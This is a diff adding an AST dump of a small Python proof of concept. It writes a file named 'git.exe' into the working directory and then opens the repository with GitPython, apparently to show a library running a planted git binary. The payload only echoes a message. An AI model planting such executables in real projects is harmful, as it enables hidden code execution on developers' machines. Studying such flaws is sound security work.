@@ -1,0 +1,114 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='os')]),
+        Import(
+            names=[
+                alias(name='git')]),
+        Assign(
+            targets=[
+                Name(id='malicious_git_path', ctx=Store())],
+            value=Call(
+                func=Attribute(
+                    value=Attribute(
+                        value=Name(id='os', ctx=Load()),
+                        attr='path',
+                        ctx=Load()),
+                    attr='join',
+                    ctx=Load()),
+                args=[
+                    Call(
+                        func=Attribute(
+                            value=Name(id='os', ctx=Load()),
+                            attr='getcwd',
+                            ctx=Load()),
+                        args=[],
+                        keywords=[]),
+                    Constant(value='git.exe')],
+                keywords=[])),
+        With(
+            items=[
+                withitem(
+                    context_expr=Call(
+                        func=Name(id='open', ctx=Load()),
+                        args=[
+                            Name(id='malicious_git_path', ctx=Load()),
+                            Constant(value='w')],
+                        keywords=[]),
+                    optional_vars=Name(id='f', ctx=Store()))],
+            body=[
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='f', ctx=Load()),
+                            attr='write',
+                            ctx=Load()),
+                        args=[
+                            Constant(value='# Malicious code here\n')],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='f', ctx=Load()),
+                            attr='write',
+                            ctx=Load()),
+                        args=[
+                            Constant(value='import os\n')],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='f', ctx=Load()),
+                            attr='write',
+                            ctx=Load()),
+                        args=[
+                            Constant(value="os.system('echo Malicious code executed!')\n")],
+                        keywords=[]))]),
+        Try(
+            body=[
+                Assign(
+                    targets=[
+                        Name(id='repo', ctx=Store())],
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='git', ctx=Load()),
+                            attr='Repo',
+                            ctx=Load()),
+                        args=[
+                            Constant(value='.')],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Name(id='print', ctx=Load()),
+                        args=[
+                            Call(
+                                func=Attribute(
+                                    value=Attribute(
+                                        value=Name(id='repo', ctx=Load()),
+                                        attr='git',
+                                        ctx=Load()),
+                                    attr='status',
+                                    ctx=Load()),
+                                args=[],
+                                keywords=[])],
+                        keywords=[]))],
+            handlers=[
+                ExceptHandler(
+                    type=Name(id='Exception', ctx=Load()),
+                    name='e',
+                    body=[
+                        Expr(
+                            value=Call(
+                                func=Name(id='print', ctx=Load()),
+                                args=[
+                                    JoinedStr(
+                                        values=[
+                                            Constant(value='Error: '),
+                                            FormattedValue(
+                                                value=Name(id='e', ctx=Load()),
+                                                conversion=-1)])],
+                                keywords=[]))])],
+            orelse=[],
+            finalbody=[])],
+    type_ignores=[])
